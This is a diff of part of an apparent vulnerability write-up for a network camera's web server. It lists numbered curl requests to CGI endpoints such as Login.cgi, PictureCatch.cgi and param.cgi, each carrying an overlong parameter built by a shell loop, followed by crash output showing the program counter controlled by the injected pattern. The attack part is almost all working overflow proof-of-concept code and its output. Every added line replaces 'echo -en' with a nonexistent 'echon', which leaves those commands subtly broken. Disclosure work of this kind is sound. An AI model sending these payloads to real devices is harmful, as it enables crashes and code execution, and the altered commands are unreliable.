@@ -159,7 +159,7 @@ curl -v http://192.168.57.20:80/PSIA/System/configurationData
 
 11)
 /usr/local/thttpd
-curl -v "http://192.168.57.20:80/htpasswd?password=`for((i=0;i<140;i++));do echo -en "X";done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
+curl -v "http://192.168.57.20:80/htpasswd?password=`for((i=0;i<140;i++));do echon "X";done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
 
 Program received signal SIGSEGV, Segmentation fault.
 0x49494948 in ?? ()
@@ -189,7 +189,7 @@ cpsr           0x20000030	536870960
 
 12)
 /usr/local/thttpd
-curl -v http://192.168.57.20:80/geo-cgi/param.cgi?skey=`for((i=0;i<44;i++)); do echo -en "X"; done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN
+curl -v http://192.168.57.20:80/geo-cgi/param.cgi?skey=`for((i=0;i<44;i++)); do echon "X"; done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN
 
 Program received signal SIGSEGV, Segmentation fault.
 0x49494948 in ?? ()
@@ -219,19 +219,19 @@ cpsr           0x60000030	1610612784
 
 13)
 /www/PictureCatch.cgi
-curl -v "http://192.168.57.20:80/PictureCatch.cgi?username=`for((i=0;i<324;i++));do echo -en "A";done`BBBB&password=GEOVISION&data_type=1&attachment=1&channel=1&secret=1&key=PWNED"
+curl -v "http://192.168.57.20:80/PictureCatch.cgi?username=`for((i=0;i<324;i++));do echon "A";done`BBBB&password=GEOVISION&data_type=1&attachment=1&channel=1&secret=1&key=PWNED"
 
 [pid  2215] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
 
 14)
 /www/Login3gpp.cgi
-curl -v "http://192.168.57.20:80/Login3gpp.cgi?username=`for((i=0;i<444;i++));do echo -en "A";done`BBBB&password=PWNED"
+curl -v "http://192.168.57.20:80/Login3gpp.cgi?username=`for((i=0;i<444;i++));do echon "A";done`BBBB&password=PWNED"
 
 [pid  2161] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424243} ---
 
 15)
 /www/Login.cgi
-curl -v "http://192.168.57.20:80/Login.cgi?username=`for((i=0;i<477;i++));do echo -en "A";done`BBBB&password=PWNED"
+curl -v "http://192.168.57.20:80/Login.cgi?username=`for((i=0;i<477;i++));do echon "A";done`BBBB&password=PWNED"
 
 [pid  2135] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
 
